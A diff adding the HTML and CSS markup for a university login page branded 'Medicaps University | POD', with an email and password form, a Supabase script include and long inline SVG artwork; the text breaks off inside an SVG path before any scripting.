@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Medicaps University | POD</title>
+    <!-- Supabase Library -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="logo2.png">
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Red Hat Display Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    <style>
+        html, body {
+            font-family: 'Red Hat Display', sans-serif;
+            overflow: hidden !important; /* Strictly lock scrolling on the website */
+            height: 100vh;
+            width: 100vw;
+            margin: 0;
+            padding: 0;
+        }
+        
+        /* Variables used by the custom SVG illustration extracted from your HTML */
+        :root {
+            --primary: #2d388a;   /* Medicaps Blue */
+            --secondary: #e8eaf6; /* Light Blue/Gray tint */
+        }
+
+        /* Custom input outline behavior mimicking Material UI */
+        .mui-input:focus-within {
+            border-color: #1976d2;
+            border-width: 2px;
+            padding-top: 9px;
+            padding-bottom: 9px;
+            padding-left: 11px;
+            padding-right: 11px;
+        }
+
+        /* Error state for invalid email */
+        .mui-input.invalid-email {
+            border-color: #d32f2f !important;
+        }
+        .mui-input.invalid-email:focus-within {
+            border-color: #d32f2f !important;
+        }
+        
+        /* Custom Scrollbar for Full Screen Calendar */
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 8px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-track {
+            background: transparent; 
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background: #cbd5e1; 
+            border-radius: 10px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+            background: #94a3b8; 
+        }
+    </style>
+</head>
+<body class="flex flex-col md:flex-row bg-white relative">
+
+    <!-- Left Column (Branding & Background) -->
+    <div class="relative hidden md:flex flex-shrink-0 w-[65%] h-full bg-[rgb(222,225,237)] overflow-hidden">
+        <img src="Picture1.jpg" alt="University Campus" class="absolute inset-0 w-full h-full object-cover">
+        <div class="absolute inset-0 bg-gradient-to-b from-[rgba(0,0,0,0.45)] to-[rgba(0,0,0,0.7)]"></div>
+        
+        <div class="absolute z-10 top-[24px] left-[24px] lg:top-[32px] lg:left-[32px] flex flex-row items-center gap-5">
+            <div class="bg-white rounded-md px-3.5 py-3 shadow-md shrink-0 flex items-center justify-center">
+                <img src="https://calyx-production-media.s3.amazonaws.com/thumbnails/college_logos/Medicaps_Linear_Logo.png.0x60_q85_pad_image_size_ratio_const-dashboard_and_mail.png" alt="Medicaps University" class="h-[44px] w-auto object-contain">
+            </div>
+            <div class="flex flex-col">
+                <h1 class="text-white text-[28px] font-bold tracking-wide leading-tight">Medicaps University</h1>
+                <h2 class="text-white text-[18px] font-bold mt-0.5 opacity-90 leading-tight">Indore, Madhya Pradesh</h2>
+            </div>
+        </div>
+    </div>
+
+    <!-- Right Column (Authentication Form) -->
+    <div class="flex-shrink-0 w-full md:w-[35%] h-full bg-white flex flex-col overflow-hidden">
+        
+        <div class="flex-1 flex flex-col justify-center px-8 lg:px-12 py-6 w-full max-w-[500px] mx-auto">
+            
+            <button class="text-[#1976d2] flex items-center text-[15px] font-medium mb-8 hover:underline w-max transition-colors">
+                <svg class="w-[20px] h-[20px] mr-1" focusable="false" aria-hidden="true" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M16.5791 3.35435C17.1158 3.84912 17.1428 4.67789 16.6396 5.20546L10.1583 12L16.6396 18.7945C17.1428 19.3221 17.1158 20.1509 16.5791 20.6456C16.0425 21.1404 15.1995 21.1138 14.6963 20.5862L7.36043 12.8959C6.87986 12.3921 6.87986 11.6079 7.36043 11.1041L14.6963 3.41376C15.1995 2.88618 16.0425 2.85959 16.5791 3.35435Z"></path>
+                </svg>
+                Go Back
+            </button>
+
+            <h1 class="text-[21px] leading-tight font-[1000] text-[#1a1a1a] mb-6 whitespace-nowrap">
+                Already a Member? Please proceed.
+            </h1>
+
+            <form id="loginForm" class="flex flex-col gap-5" novalidate>
+                
+                <div class="relative">
+                    <input type="email" placeholder="Email Address*" id="emailInput" value="prasad.muley@medicaps.ac.in" class="mui-input w-full border border-[#c4c4c4] rounded-[4px] px-4 py-3 text-[14px] text-gray-900 outline-none transition-all placeholder:text-gray-400" required>
+                </div>
+
+                <div class="relative group">
+                    <input type="password" id="password" placeholder="Password*" class="mui-input w-full border border-[#c4c4c4] rounded-[4px] pl-4 pr-10 py-3 text-[14px] text-gray-900 outline-none transition-all placeholder:text-gray-400" required>
+                    <button type="button" id="togglePassword" class="absolute right-2 top-1/2 -translate-y-1/2 p-1.5 text-gray-500 hover:bg-gray-100 rounded-full transition-colors" aria-label="Show Password">
+                        <svg class="w-[20px] h-[20px]" focusable="false" aria-hidden="true" viewBox="0 0 24 24" fill="currentColor">
+                            <g>
+                                <path fill-rule="evenodd" clip-rule="evenodd" d="M4.45615 12C4.54155 12.1549 4.65912 12.3596 4.80789 12.5991C5.15833 13.1634 5.6774 13.914 6.35164 14.6619C7.71253 16.1715 9.62492 17.5843 12.0001 17.5843C14.3752 17.5843 16.2876 16.1715 17.6485 14.6619C18.3227 13.914 18.8418 13.1634 19.1922 12.5991C19.341 12.3596 19.4586 12.1549 19.544 12C19.4586 11.8451 19.341 11.6404 19.1922 11.4009C18.8418 10.8366 18.3227 10.086 17.6485 9.33807C16.2876 7.82848 14.3752 6.41573 12.0001 6.41573C9.62492 6.41573 7.71253 7.82848 6.35164 9.33807C5.6774 10.086 5.15833 10.8366 4.80789 11.4009C4.65912 11.6404 4.54155 11.8451 4.45615 12ZM20.3194 12C20.9283 11.6834 20.9281 11.6832 20.928 11.6829L20.9269 11.6805L20.9244 11.6754L20.916 11.6583C20.9089 11.644 20.8988 11.6238 20.8858 11.5983C20.8598 11.5471 20.8219 11.4742 20.7724 11.3826C20.6733 11.1995 20.5274 10.9412 20.3358 10.6328C19.9536 10.0173 19.3855 9.19492 18.6416 8.36979C17.1664 6.73332 14.9191 5 12.0001 5C9.08105 5 6.83375 6.73332 5.35848 8.36979C4.61464 9.19492 4.04653 10.0173 3.66429 10.6328C3.47276 10.9412 3.32678 11.1995 3.22775 11.3826C3.1782 11.4742 3.14033 11.5471 3.11431 11.5983C3.1013 11.6238 3.09124 11.644 3.08416 11.6583L3.07577 11.6754L3.07325 11.6805L3.07242 11.6823C3.07229 11.6825 3.07186 11.6834 3.68068 12L3.07186 11.6834C2.97605 11.8827 2.97605 12.1173 3.07186 12.3166L3.68068 12C3.07186 12.3166 3.07173 12.3163 3.07186 12.3166L3.07325 12.3195L3.07577 12.3246L3.08416 12.3417C3.09124 12.356 3.1013 12.3762 3.11431 12.4017C3.14033 12.4529 3.1782 12.5258 3.22775 12.6174C3.32678 12.8005 3.47276 13.0588 3.66429 13.3672C4.04653 13.9827 4.61464 14.8051 5.35848 15.6302C6.83375 17.2667 9.08105 19 12.0001 19C14.9191 19 17.1664 17.2667 18.6416 15.6302C19.3855 14.8051 19.9536 13.9827 20.3358 13.3672C20.5274 13.0588 20.6733 12.8005 20.7724 12.6174C20.8219 12.5258 20.8598 12.4529 20.8858 12.4017C20.8988 12.3762 20.9089 12.356 20.916 12.3417L20.9244 12.3246L20.9269 12.3195L20.9277 12.3177C20.9278 12.3175 20.9283 12.3166 20.3194 12ZM20.3194 12L20.9283 12.3166C21.0241 12.1173 21.0238 11.8822 20.928 11.6829L20.3194 12Z"></path>
+                                <path fill-rule="evenodd" clip-rule="evenodd" d="M12 10.3846C11.1078 10.3846 10.3846 11.1078 10.3846 12C10.3846 12.8922 11.1078 13.6154 12 13.6154C12.8922 13.6154 13.6154 12.8922 13.6154 12C13.6154 11.1078 12.8922 10.3846 12 10.3846ZM9 12C9 10.3431 10.3431 9 12 9C13.6569 9 15 10.3431 15 12C15 13.6569 13.6569 15 12 15C10.3431 15 9 13.6569 9 12Z"></path>
+                            </g>
+                        </svg>
+                    </button>
+                </div>
+
+                <div class="flex justify-end -mt-1.5">
+                    <a href="#" class="text-[14px] text-[#1976d2] font-medium hover:underline">Forgot Password?</a>
+                </div>
+
+                <div id="authMessage" class="hidden text-[14px] text-center font-medium rounded p-2 transition-all"></div>
+
+                <button type="submit" id="submitBtn" class="w-full bg-[#2d388a] hover:bg-[#202761] text-white font-medium text-[16px] py-2.5 rounded shadow-sm hover:shadow-md transition-all tracking-wide">
+                    Log in
+                </button>
+            </form>
+
+            <button class="mt-10 w-full border border-gray-300 rounded-lg p-3 flex items-center justify-between hover:bg-gray-50/50 transition-colors group text-left">
+                <div class="flex items-center gap-4">
+                    <div class="shrink-0 transform scale-[0.95] origin-center m-0">
+                        <svg width="72" height="72" viewBox="0 0 72 72" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="m32.911 21.456-2.266 8.604 7.43-.18-.575-.756s-4.212-.756-4.589-7.668Z" fill="var(--primary)" fill-opacity=".27"></path>
+                            <path d="m30.61 30.088.01-.035 2.31-8.77.009.172c.106 1.964.614 4.67 2.424 6.408 1.08 1.036 2.131 1.235 2.142 1.237h.01l.614.807-7.519.181Zm2.285-8.462-2.214 8.406 7.344-.178-.538-.706c-.114-.023-1.122-.256-2.157-1.247-.993-.948-2.21-2.804-2.435-6.275Z" fill="var(--primary)" fill-opacity=".27"></path>
+                            <path d="M29.256 30.312s-.372 7.68 3.12 13.44l-9.672-1.632-1.368 5.256 1.656-.864s11.16 8.208 15.336 2.664c4.176-5.544.816-14.184.816-14.184l-2.546-6.01" fill="#222"></path>
+                            <path d="m21.799 44.882-.1.271c.043-.347.121-.586.015-.335.085.064-.272 1.084-.187 1.148l-.067.177c.014-.051.01-.062.025-.113a.725.725 0 0 0-.069.327 1.102 1.102 0 0 1-.026.263l-.017.072-.026.096c-.072.236-.134.427-.101.259l-.115.534a.91 91 0 0 1-.026.088c.021-.008.014 0-.015.019a.902.902 0 0 1 .026-.117l-.03.122.677-.36-.005.006.216-.144.147-.102c.134-.054-.059.042-.02.036l.265-.165c.124-.037-.093.105-.288.201.303-.047.216-.144.8-.38l-.254.143c.077-.016.151-.04.223-.072l.06-.026.03-.015.014-.006a.035.035 0 0 1 .016 0l.005.013v.008l.048.041-.025-.026-.02-.018c-.005-.005 0-.004 0-.005a.07.07 0 0 0-.007-.034c-.007-.026-.13 0-.03-.068.012 0 .024-.008.036-.012.014.012.03.023.046.032h.007l.012.007.036.022.08.046c-.02.03.133.125.32.25l-.039.029c.209.124.207.094.336.155.223.152.252.212.288.272.36.239-.22-.21.216.059.287.196.589.37.902.52.21.144-.051 0 .02.06l.21.08c.047.029.026.03.015.03.17.082.036-.031.298.105.094-.005.491.36.842.483.072.053-.052.004-.036.033.255.119.517.224.783.316.1.06.2.122.301.181-.216-.144.098-.035.372.056-.076-.053-.14-.1-.184-.129l.425.172c.047.029 0 .025-.078.01l.082.026c.144.083.054.072-.065.047l-.138-.095c-.114-.023-.223-.04-.216-.006.03.009.084.029.144.053-.03-.005-.05-.008-.04 0 .043.02.088.034.134.044l.072.09.032-.008c.177.093.356.184.537.273.418.12.792.196 1.44.402-.172-.02-.055.046-.078.085-.16-.106-.504-.16-.832-.302.17.072.125.078.078.067.202.064.404.126.608.184-.026.03.116.072.268.14-.095-.108.463.108.717.156.008.027-.059.036-.357-.065.316.157.453.051.767.186a.507.507 0 0 0-.144-.03c.178.03.6.15.494.143l-.072-.018c.316.083.636.149.96.196.33.047.612.06.652.033.004.009-.072.066-.106.072.154-.013.31-.038.462-.059.153-.02.306-.05.456-.085-.082.05.226.183-.2.203.06.008.129.01.215.013h.144c.053 0 .11-.007.175-.013-.084-.005-.208-.072-.095-.078.313.05.216.028.606.047-.126 0 .006-.095.2-.115-.03.016.027.08-.044.096.08-.02.16-.049.238-.072a2.31 2.31 0 0 0 .234-.084c-.116.04-.007.072.107.072-.054 0 .42-.097.54-.157-.071.015-.136.035-.206.046a1.95 1.95 0 0 0 .312-.114 1.73 1.73 0 0 0 .194-.119c.058-.037.113-.08.185-.126.036-.023.077-.047.123-.072.047-.026.097-.059.157-.09-.049.045-.096.17.158.041.022-.025.057-.072.102-.123.046-.05.102-.116.161-.192.06-.076.132-.151.2-.239a2.55 2.55 0 0 1 .112-.128c.04-.043.072-.089.114-.132l.082-.045c.082-.09.151-.19.227-.283a4.862 4.862 0 0 1-.116.212c-.05.087-.117.18-.184.279-.068.1-.151.191-.228.281-.076.09-.157.165-.225.227.043-.026.087-.05.133-.072.066-.039.128-.083.185-.133.05-.028.022.007-.028.055-.05.049-.127.105-.165.134l.152-.108c.052-.036.098-.077.144-.116.046-.038.098-.077.144-.118l.138-.126c-.05-.006.354-.447.296-.457l-.057.081-.062.079-.126.155c-.042.052-.09.1-.134.15-.045.05-.09.1-.14.144-.014-.005-.004-.032.024-.073.037-.063.08-.123.125-.181.112-.144.263-.346.423-.545.096-.09.007.129.026.131.037-.059.259-.415.298-.446l-.104.193c.078-.102.146-.21.204-.325l.094-.172c.04-.066.083-.13.131-.19.064-.099.238-.272.216-.307a.224.224 0 0 1-.205.081.095.095 0 0 1-.08-.081.096.096 0 0 1 .004-.04c.013-.016.093-.144.183-.283l.223-.343c.059-.08.054 0 .046.078-.008.079-.026.162.03.096a.673.673 0 0 1 .034-.16c.06-.108.016.064.12-.185-.027-.06.221-.5.012-.133.023-.062.042-.108.06-.148.017-.04.029-.072.043-.109.03-.072.064-.144.116-.288-.032.041-.034-.033-.018-.147.016-.135.039-.27.069-.401.008.017.04-.034.056-.059.136-.42.246-.847.332-1.28.024-.043.072-.28.078-.174a1.85 1.85 0 0 1 .017-.293c.085-.288-.044.342.04.124a.802.802 0 0 1 0-.238c.012-.125.015-.275.02-.385-.026.031-.04.157-.052.303l-.034.42c-.063-.009-.057-.395-.038-.913.015-.205.021-.249.033-.25.013-.002.02.04.018 0a4.51 4.51 0 0 0 .017-.44 2.583 2.583 0 0 0-.024-.261c-.024-.2-.028-.4-.01-.6.036-.257.077-.013.104-.073.02.337-.029.517-.032.745l.025-.28c.013.15.013.303 0 .455.015-.101.023-.203.026-.305.006-.144.013-.319.01-.504-.002-.185 0-.389-.008-.576-.007-.187-.007-.372-.01-.523-.02-.106-.047-.288-.056-.2l.018.189c-.018.175-.067-.353-.065-.113a8.698 8.698 0 0 1-.121-.887l.036-.072a.42.42 0 0 0 0 .133c.003.067.01.134.024.2-.03-.144-.005-.552-.082-.706v.256c-.052-.25-.144-.554-.181-.868-.02.149.018.072 0 .3.017-.1.046.1.072.284.026.185.044.36.059.198a1.487 1.487 0 0 0 0 .325 2.66 2.66 0 0 1 0 .377c.014-.011.017-.11.036.155a.463.463 0 0 1 .018.056v.018-.02a.682.682 0 0 1 .01-.136c.05.127.072.549.101.69 0 .158-.019-.065-.031.022l.034.211c-.031.023-.037.418-.072.05 0 .111.01.221.01.332a5.52 5.52 0 0 0-.01.63c-.011.156.025.396 0 .26.005.173 0 .347-.006.52l-.008.005c-.015.256-.033.519-.054.791-.012.137-.035.274-.057.414-.011.072-.024.14-.039.21-.014.07-.037.14-.057.211-.013.085-.025.172-.042.273-.02.12-.048.237-.083.353l-.041.048c-.01.054-.028.12-.048.192l-.03.11-.037.108c-.04.103-.07.21-.089.32-.103.198-.19.406-.258.62a3.06 3.06 0 0 1-.078.2l-.08.194c-.042.11-.09.219-.145.324l.026.029c-.124.235-.224.471-.39.758h.039a2.371 2.371 0 0 1-.119.216l-.036.059-.042.057-.091.12c-.125.162-.26.344-.403.514a.812.812 0 0 1 .14-.175c-.05.046-.096.095-.145.144l-.067.076-.072.076-.136.155-.144.15a2.26 2.26 0 0 1-.612.482 1.137 1.137 0 0 1-.13.09c-.043.023-.081.04-.12.057l.026-.015-.044.023c-.05.02-.099.043-.155.062a.794.794 0 0 0 .132-.05c-.079.05-.206.108-.327.175l-.069-.01-.028.012c-.13.038-.095.055-.018.053-.063.03-.12.064-.164.085a.562.562 0 0 0-.236.06.72.72 0 0 1-.269.05.81.81 0 0 1-.144.048 3.246 3.246 0 0 1-.236.059c-.169.04-.337.072-.371.105-.006-.007-.048-.006.028-.015-.156.014-.313.012-.452.039l-.069-.042c-.112.022-.226.047-.341.063-.208-.03-.292-.048-.086-.077-.124.013-.212.011-.28.014-.069.003-.116 0-.163 0-.092-.005-.174 0-.388 0l.023-.026c-.15-.014-.397-.012-.484-.05-.164-.053-.576-.126-1.051-.247a10.714 10.714 0 0 1-1.391-.461c.067.068-.027.026-.144-.027-.118-.054-.255-.12-.283-.096-.04-.037-.15-.092-.012-.056-.425-.14-.612-.275-.918-.344-.039-.038.1.01.063-.018a.663.663 0 0 1-.175-.072c-.038-.03.066.01.134.03-.42-.177-.485-.143-.54-.105a1.404 1.404 0 0 0-.473-.203c-.065-.052-.178-.129.081-.011l-.49-.25c-.203-.1-.391-.191-.41-.175a1.376 1.376 0 0 0-.235-.12l-.653-.36.082.054c-.15-.02-.264-.132-.514-.268h.01c-.543-.36-.254-.123-.782-.495l.011.048c-.09.033-.463-.335-.792-.515l.103.09c-.186-.09-.423-.396-.587-.518-.033-.03.065.03.12.062-.419-.336-.084 0-.419-.216-.046-.062.112.003-.104-.154a.343.343 0 0 0-.026-.021l-.063-.046-.176-.12-.154.09-.082.047-.031.02-.026.015c-.067.043-.14.087-.216.13a2.808 2.808 0 0 1-.424.216c.08-.02.16-.041 0 .058a3.255 3.255 0 0 1-.185.09l-.052.024-.02.008-.014.005-.057.02a.72.72 0 0 0-.195.091.044.044 0 0 0-.01-.033.187.187 0 0 1 .028-.047c0-.043.017-.123.035-.224a2.77 2.77 0 0 0 .063-.384c.167-.165.288-1.327.391-1.296l.164-.648.006.02c.074-.234.12-.476.14-.72.032-.094.024-.021.027-.012.13-.385.22-.782.27-1.185l.049-.044c0-.014.005-.032.01-.056 0-.011.007-.023.01-.038l.012-.04c.01-.037.027-.081.042-.127l.138.034.28.055c.194.036.398.072.588.088a.144.144 0 0 1-.072.005c.69.072 1.617.373 1.888.288l.455.045c-.58-.108.097-.041-.14-.103.23.031.586.139.304.098l-.044-.014c-.114.05.72.144.697.189 1.146.19 2.256.415 3.329.599l-.115-.072.374.066c.097.029.125.063-.144.016.15.04.307.054.462.04.519.11-.216.027-.054.055l.216.033-.049-.014c.175-.004.35.012.521.045.2.045.099.05.178.065 0 .004.026.01.122.022l.72.126a13.602 13.602 0 0 1-.327-.097c.278.026.614.106.25 0l.114.032.034.008c.005 0 .013.004.016 0l-.006-.012-.025-.052a9.65 9.65 0 0 0-.144-.276l-.197-.354-.153-.288-.144-.275-.123-.252c-.072-.152-.129-.267-.144-.314a6.142 6.142 0 0 1-.39-.86c.026.086 0 .154-.11-.137.129.072-.168-.548-.184-.81.015.115-.06-.093-.13-.287-.072-.194-.136-.372-.114-.192-.073-.252.029-.027-.008-.222-.224-.576-.36-1.314-.541-2.056-.015-.009-.006.12-.06-.036l-.023-.409c-.038-.144-.1-.121-.109-.4-.003.04-.008.1-.03 0-.112-.743-.24-1.498-.334-2.261a14.836 14.836 0 0 1-.125-2.3c-.017.208-.025.073-.032-.087 0 .103-.032 0-.047.02.007-.213.017-.426.03-.639-.052-.116-.008-.682-.05-.75l.006.202c-.053-.269-.121.377-.188.339.063.3-.077.801.037 1.296-.008.11-.027-.092-.04-.033.043.183.061.37.057.558l-.01-.031.04.523c.011.156.022.301.03.449.01.147.023.298.036.467.013.17.03.356.055.576l.025-.072c.013.106.02.214.02.321.082.21-.072-.533.014-.342-.016.13.025.465.076.788.052.322.104.636.078.727.054.288.023-.092.077.198l-.006.08.04.068c.033.191.025.288.01.303-.008-.047-.03-.13-.042-.18.018.152.047.303.087.45.037.152.072.284.078.327-.018-.093-.032-.187-.048-.28.188.782.413 1.741.7 2.467v-.061c.067.167.126.337.176.51.053.189.118.374.194.554l-.012-.021c.03.058.062.127.096.202.033.075.072.156.102.239-.08-.144.083.3-.018.108.058.14.127.276.206.406.06.078.116.16.167.243l.016.1c.097.13.18.269.249.416-.138-.23.054.205-.104-.05.031.08.062.153.092.222.03.068.065.13.097.188.063.117.123.216.176.305l.04.065.009.016.006.008.011.017a.67.67 0 0 1 .042.072c.023.044.037.085.022.102.05.048.072.065.072.051a.38.38 0 0 0-.046-.102c-.05-.092-.116-.2-.079-.15a.07.07 0 0 1-.004-.027s.006 0 .014.006a.536.536 0 0 1 .063.072 2.458 2.458 0 0 1 .194.32l.007.022v.01h-.011a4.245 4.245 0 0 1-.177-.062 4.893 4.893 0 0 0-.167-.06 1.582 1.582 0 0 0-.082-.025 3.536 3.536 0 0 0-.181-.034c.054.01.058.005.112.014-.198-.052-.4-.042-.641-.114-.144.021-.32-.056-.37-.007l.496.072c-.283-.032-.556-.01-1.012-.12.091-.003.183.001.274.01-.133-.04-.262-.033-.4-.072.05-.05.603.09.91.097-.144-.049-.576-.055-.413-.09-.23.04-.528-.1-.903-.102l.03-.03a2.753 2.753 0 0 1-.288-.028l.199-.01c-.302-.013-.563-.13-.85-.157.593.099.126.063.373.13-.739-.078-.406-.16-1.224-.28.111.013.412.09.236.076a4.489 4.489 0 0 1-.45-.115c-.544-.084.077.049-.158.031-.177-.072-.268-.028-.508-.055l.003-.035c-.614-.126-.175.044-.727-.076l.243-.008-.288-.037.066-.029a4.42 4.42 0 0 1-.724-.111c.067.036-.051.055-.325.01-.184-.052.11-.015-.28-.072a.731.731 0 0 1 .356.043c.02-.009.09-.007.11-.015a5.906 5.906 0 0 0-.645-.114c.054.01.118.023.15.033l-.57-.047c-.086-.028-.014-.026.057-.025-.115-.015-.196-.013-.36-.038.048-.02.042-.051.281-.025l-.54-.059c-.034-.017-.27-.08-.198-.078a3.704 3.704 0 0 0-.425-.06l-.246-.026a14.443 14.443 0 0 1-.42-.06c-.031.12-.062.236-.097.352 0 .01 0 .02-.004.035-.004.014-.004.025-.007.042a2.37 2.37 0 0 1-.018.096c-.101.36-.216.675-.293 1.115l-.119.23c-.076.34.144-.315.02.251-.088.402-.08.137-.13.274-.03.313-.099.622-.203.919.025-.127.054-.22.08-.334Zm1.14 1.835a.296.296 0 0 1-.027.023l-.072.048a.468.468 0 0 1-.133.062.308.308 0 0 1 .111-.085.908.908 0 0 1 .122-.048Zm5.597 3.049a.926.926 0 0 1-.24-.115c.081.034.162.072.24.115Zm11.712-7.774V42c-.007.183 0 .119 0-.01Zm.01-.383c-.006-.038-.01-.035-.015-.019.012.07.016.14.011.21a.485.485 0 0 0 .007-.19h-.003Zm-8.6 2.167-.072-.022c.166.015.12.016.072.022Z" fill="var(--secondary)"></path>
+                            <path fill-rule="evenodd" clip-rule="evenodd" d="M49.013 15.829c-.013.082-.113.056-.19.06a.864.864 0 0 1-.194.019c-.04 0-.025-.025-.058-.028-.102 0-.157-.015-.273-.016a.918.918 0 0 0-.278-.036c-.066-.009-.097-.03-.162-.038a.65.65 0 0 0-.151.011c-.053-.024-.124-.042-.168-.066a.563.563 0 0 0-.093-.007c-.036-.008-.043-.023-.08-.03a.412.412 0 0 0-.071 0c-.105-.016-.225-.037-.33-.045-.14-.027-.32-.048-.484-.078-.028 0-.064-.01-.084-.01a3.376 3.376 0 0 0-.44-.071.82.82 0 0 0-.093-.014c-.055-.01-.072-.019-.12-.028a.713.713 0 0 1-.06-.01c-.026 0-.063-.008-.094-.012-.085-.015-.196-.03-.276-.042l.126.016.155.018a.257.257 0 0 0 .054 0c.03 0 .068.009.084.009.02.004.042.006.063.005.025 0 .021.005.05.007.046.006.092.009.138.009a.486.486 0 0 0 .133.008l.083.008c.041.006.034-.005.064-.003.175.023.319.029.475.052.086 0 .144.014.216.015.066.004.157.023.207.02.092.02.186.03.28.027.061.01.123.016.186.018.093.009.211.032.3.032a.22.22 0 0 1 .08.017c.15.002.3.015.447.04.006.016.043.017.057.03.042.012.052-.007.085 0 .004.039.061.05.104.072a.43.43 0 0 0 .168 0c.026 0 .03.018.036.032.026-.012.072.005.108.008Zm-.216 1.344c-.013.082-.114.057-.19.06a.863.863 0 0 1-.194.018c-.04 0-.026-.024-.058-.027-.102 0-.157-.015-.273-.017a.917.917 0 0 0-.278-.035c-.067-.01-.097-.03-.163-.038a.655.655 0 0 0-.15.01c-.053-.023-.124-.04-.168-.066a.79.79 0 0 0-.093-.007c-.036-.007-.043-.022-.08-.03a.618.618 0 0 0-.071 0c-.105-.014-.225-.036-.332-.043-.138-.028-.317-.049-.482-.079-.028 0-.064-.01-.084-.01a3.52 3.52 0 0 0-.44-.071c-.033-.008-.056-.01-.093-.016-.055-.01-.072-.02-.12-.028a.478.478 0 0 1-.06-.012c-.026 0-.063-.007-.094-.01-.085-.015-.196-.03-.276-.043l.126.016.155.02a.325.325 0 0 0 .054 0c.03.003.067.008.083.008a.397.397 0 0 0 .064.005c.025 0 .021.005.05.007a.907.907 0 0 0 .137.008.605.605 0 0 0 .134.009l.082.009c.042.005.034-.006.065-.005.175.024.319.03.475.053.085 0 .144.014.216.014.069.01.138.017.207.02.092.02.186.03.28.028.061.01.123.016.186.018.093.008.211.032.3.031.027 0 .055.007.08.018.15.002.3.015.447.04.005.016.043.017.057.03.042.012.051-.008.085 0 .004.038.061.05.104.072.055.01.112.01.168 0 .026 0 .03.017.036.03.026-.008.072.01.108.013Zm-.217 1.343c-.012.082-.113.057-.19.06a.907.907 0 0 1-.193.02c-.04 0-.026-.025-.059-.028-.101 0-.156-.015-.272-.017a.925.925 0 0 0-.279-.035c-.066-.01-.097-.03-.162-.039a.678.678 0 0 0-.15.012c-.053-.024-.124-.042-.168-.066a.595.595 0 0 0-.094-.008c-.035-.008-.042-.022-.078-.03a.509.509 0 0 0-.072 0c-.104-.014-.224-.037-.33-.043-.14-.028-.318-.048-.483-.078a.76.76 0 0 0-.084-.01 3.679 3.679 0 0 0-.441-.073c-.032-.008-.056-.01-.092-.016-.056-.01-.072-.019-.12-.027l-.06-.012c-.026 0-.064-.007-.095-.012-.084-.014-.195-.029-.275-.041l.126.016.155.018a.27.27 0 0 0 .054 0c.03 0 .067.008.083.009.02.003.042.005.063.005.025 0 .021.004.05.006.046.006.092.009.138.01a.486.486 0 0 0 .133.007l.082.009c.042.005.035-.005.066-.004.175.023.318.03.474.053.085 0 .144.013.22.014.068.01.137.017.207.02.091.02.185.03.278.027.062.01.124.016.187.018.093.01.21.032.3.032.028 0 .056.006.081.017.15.002.299.015.446.04.006.017.043.017.058.03.041.013.05-.007.085 0 .004.04.06.05.103.072a.43.43 0 0 0 .168 0c.026 0 .03.018.037.031.022-.008.069.009.104.012Zm-.144 1.344c-.012.083-.113.057-.19.06a.908.908 0 0 1-.193.02c-.04 0-.026-.026-.06-.028-.1 0-.156-.015-.27-.017a.945.945 0 0 0-.28-.035c-.066-.009-.096-.03-.162-.038a.643.643 0 0 0-.15.01c-.053-.023-.124-.04-.168-.065a.662.662 0 0 0-.094-.008c-.036-.007-.042-.022-.078-.03a.665.665 0 0 0-.072 0c-.104-.015-.225-.036-.33-.043-.14-.028-.318-.049-.484-.079-.027 0-.064-.01-.083-.01a3.406 3.406 0 0 0-.442-.071.776.776 0 0 0-.092-.014c-.055-.01-.072-.019-.12-.028a.94.94 0 0 1-.06-.01c-.026 0-.063-.009-.094-.012-.085-.015-.196-.03-.277-.043l.127.017.155.018a.333.333 0 0 0 .054 0c.03.004.067.009.083.009.02.003.042.005.063.005.025 0 .021.005.051.007.045.006.091.008.137.008a.46.46 0 0 0 .134.009l.082.008c.042.006.034-.005.065-.003.175.023.318.029.474.052.086 0 .144.014.22.015.065.004.156.023.206.02.092.02.186.03.28.027.061.01.124.016.186.018.094.008.211.032.3.031a.23.23 0 0 1 .081.018c.15.002.299.015.446.04.006.016.044.017.058.03.042.012.051-.008.085-.003.004.038.061.05.103.072a.434.434 0 0 0 .168 0c.026 0 .03.018.037.031.022-.008.069.009.104.012Z" fill="#fff"></path>
+                            <path d="M42.937 13.373c.046-1.14-.765-2.097-1.811-2.139-1.047-.042-1.932.848-1.978 1.987-.045 1.139.766 2.097 1.812 2.139 1.046.042 1.931-.848 1.977-1.987Z" fill="var(--secondary)" fill-opacity=".24"></path>
+                            <path fill-rule="evenodd" clip-rule="evenodd" d="M43.006 13.375c-.083-.006-.12-.094-.14-.208a2.399 2.399 0 0 1-.037-.185c-.01-.064-.033-.128-.05-.185a4.107 4.107 0 0 0-.31-.504c-.077-.091-.005-.1-.068-.179-.056-.055-.099-.107-.144-.149l-.072-.066c-.023-.02-.048-.038-.072-.058l-.072-.059-.084-.053a1.282 1.282 0 0 0-.203-.101 1.393 1.393 0 0 0-.204-.1c-.033-.01-.064-.022-.095-.033-.03-.011-.062-.012-.092-.018a.808.808 0 0 0-.093-.013h-.097c-.071.002-.142.01-.212.024-.047.004-.088.01-.127.011h-.057l-.054.007c-.036.003-.072.005-.111.013-.04.007-.08.023-.125.04a.804.804 0 0 0-.315.299 1.13 1.13 0 0 0-.23.125 1.784 1.784 0 0 1-.11.078c-.036.024-.066.05-.1.072a.467.467 0 0 0-.052.066.547.547 0 0 0-.027.062 1.064 1.064 0 0 1-.05.122c-.053.096-.113.098-.157.203-.037.091-.014.149-.025.227-.08.305-.088.694.033.989.047.227.145.441.288.625.15.195.336.36.547.487a.814.814 0 0 1 .058.029l.06.024c.034.016.07.025.108.025.191.118.416.168.64.144.21-.02.41-.102.575-.236a.48.48 0 0 0 .227-.136.865.865 0 0 1 .182-.072.509.509 0 0 0 .172-.078c.03-.028.055-.058.08-.08a.233.233 0 0 1 .072-.047c.013-.04.028-.09.048-.139l.03-.072a.79.79 0 0 0 .02-.072.95.95 0 0 0 